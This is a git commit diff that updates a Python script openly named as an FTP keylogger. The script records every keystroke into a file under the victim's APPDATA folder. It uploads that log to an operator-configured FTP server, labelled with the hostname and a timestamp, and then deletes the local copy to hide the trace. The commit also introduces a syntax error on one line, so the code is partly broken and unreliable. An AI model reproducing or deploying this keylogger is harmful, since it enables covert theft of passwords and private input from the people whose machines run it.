35d5684caf48664ab2b856bf6cecc7128fbc5679
Alex Avlonitis <AlexAvlonitis@users.noreply.github.com>
2014-08-12 11:39:11 +0100

    Update Simple-FTP-Python-Keylogger.py

--- Simple-FTP-Python-Keylogger.py
+++ Simple-FTP-Python-Keylogger.py
@@ -11,47 +11,48 @@ import datetime, time
 import socket
 
 appdata = os.getenv('APPDATA')
+keyfile = appdata+'/keys.txt'
 data=""
 ts = datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
 hn = socket.gethostname()
 
-if os.path.exists(appdata+'/keys.txt'):
-	fp = open(appdata+'/keys.txt','r')
+if os.path.exists(keyfile):
+	fp = open(keyfile,'r')
 	ftp = FTP("your ftp server")
 	ftp.login("username","password")
-	ftp.cwd("Folder name") #the folder you want your files to be stored on the ftp server 
-	ftp.storbinary("STOR keys-"+hn+"-"+str(ts)+"txt", fp, 1024) # upload it on ftp, and append the filename with the hostname + current date
+	ftp.cwd("Folder name") # The folder you want your files to be stored on the ftp server 
+	ftp.storbinary("STOR keys-"+hn+"-"+str(ts)+"txt", fp, 1024) # Upload it on ftp, and append the filename with the hostname + current date
 	ftp.quit()
 	fp.close()
+	os.remove(keyfile) # Delete the file after the ftp upload
 else:
-	fp = open(appdata+'/keys.txt','w') #stores the keystrokes under %appdata%
-
+	fp = open(keyfile,'w') # Stores the keystrokes under %appdata%
 	
 def keypressed(event):
 	global data
 	if event.Ascii==13:
 		keys='<ENTER>\n'
-		fp=open(appdata+'/keys.txt','a')
+		fp=open(keyfile','a')
 		data=keys
 		fp.write(data)
 		fp.close()
 	elif event.Ascii==8:
 		keys='<BACK SPACE>'
-		fp=open(appdata+'/keys.txt','a')
+		fp=open(keyfile,'a')
 		data=keys
 		fp.write(data)
 		fp.close()
 	elif event.Ascii==9:
 		keys='<TAB>'
-		fp=open(appdata+'/keys.txt','a')
+		fp=open(keyfile,'a')
 		data=keys
 		fp.write(data)
 		fp.close()
 	elif event.Ascii==27:
-		raise SystemExit # stop the script if you press esc
+		raise SystemExit # Stop the script if you press esc
 	else:
 		keys=chr(event.Ascii)
-		fp=open(appdata+'/keys.txt','a')
+		fp=open(keyfile,'a')
 		data=keys
 		fp.write(data)
 		fp.close()
